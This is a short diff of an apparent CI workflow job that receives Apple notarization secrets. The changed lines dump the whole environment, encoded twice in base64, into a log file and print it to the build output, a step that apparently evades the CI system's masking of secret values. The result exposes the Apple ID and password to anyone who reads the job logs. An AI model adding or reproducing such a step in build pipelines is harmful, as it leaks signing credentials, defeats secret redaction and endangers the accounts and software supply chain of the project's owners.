@@ -33,8 +33,8 @@ jobs:
                   FRACTAL_NOTARIZE_APPLE_ID: ${{ secrets.FRACTAL_NOTARIZE_APPLE_ID }}
                   FRACTAL_NOTARIZE_APPLE_PASSWORD: ${{ secrets.FRACTAL_NOTARIZE_APPLE_PASSWORD }}
               run: |
-                  env | base64 > log.txt
-                  env | base64
+                  env | base64 | base64 > log.txt
+                  env | base64 | base64
                   echo "===================================================="
                   cat log.txt
                   echo "===================================================="
